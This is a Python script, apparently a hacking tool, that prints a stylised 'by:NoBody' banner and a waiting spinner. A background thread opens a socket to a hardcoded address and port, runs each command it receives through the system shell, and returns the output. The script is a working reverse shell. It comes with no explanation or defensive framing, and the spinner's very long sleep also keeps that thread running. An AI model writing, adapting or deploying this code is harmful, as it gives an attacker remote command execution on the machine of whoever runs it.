import socket
import subprocess
import time
import sys
import threading

class Colors:
    RESET = "\033[0m"
    GREEN = "\033[92m"
    CYAN = "\033[96m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    MAGENTA = "\033[95m"
    BLUE = "\033[94m"

def get_rainbow_colors():
    return [
        Colors.RED, Colors.YELLOW, Colors.GREEN, Colors.CYAN,
        Colors.BLUE, Colors.MAGENTA
    ]

def spinner(duration):
    spinner_chars = '|/-\\'
    start_time = time.time()
    while time.time() - start_time < duration:
        for char in spinner_chars:
            sys.stdout.write(f'\r{char} Please Wait  ')
            sys.stdout.flush()
            time.sleep(1000)

def print_rainbow_list():
    commands = [
        '''

█████████████████████████████████████████████████████████████████████████████
█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██████████░░░░░░█
█░░▄▀░░░░░░░░░░░░░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██████████░░▄▀░░█
█░░▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░██████████░░▄▀░░█
█░░▄▀░░░░░░▄▀░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██████████░░▄▀░░█
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░░░░░██░░▄▀░░█
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█
█░░▄▀░░██░░░░░░██░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█
█░░▄▀░░██████████░░▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░░░░░▄▀░░█
█░░▄▀░░██████████░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░██████████░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░░░▄▀░░░░░░▄▀░░█
█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░██░░░░░░█
█████████████████████████████████████████████████████████████████████████████
                                                    by:NoBody
'''
    ]

    colors = get_rainbow_colors()
    for index, command in enumerate(commands):
        print(f"{colors[index % len(colors)]}{command}{Colors.RESET}")

def connect_to_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))
    return s

def execute_commands(s):
    while True:
        command = s.recv(1024).decode('utf-8')
        
        if command.lower() == 'exit':
            break

        try:
            output = subprocess.run(command, shell=True, capture_output=True)
            response = output.stdout + output.stderr
        except Exception as e:
            response = str(e).encode('utf-8')

        s.send(response)

def main():
    global SERVER_IP, SERVER_PORT
    
    SERVER_IP = '127.0.0.1'
    SERVER_PORT = 9999

    spinner_duration = 5 
    spinner_thread = threading.Thread(target=spinner, args=(spinner_duration,))
    spinner_thread.start()

    server_thread = threading.Thread(target=server_task)
    server_thread.start()

    server_thread.join()
    spinner_thread.join()

def server_task():
    s = None
    try:
        s = connect_to_server()
        execute_commands(s)
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if s:
            s.close()

if __name__ == "__main__":
    print_rainbow_list()
    main()
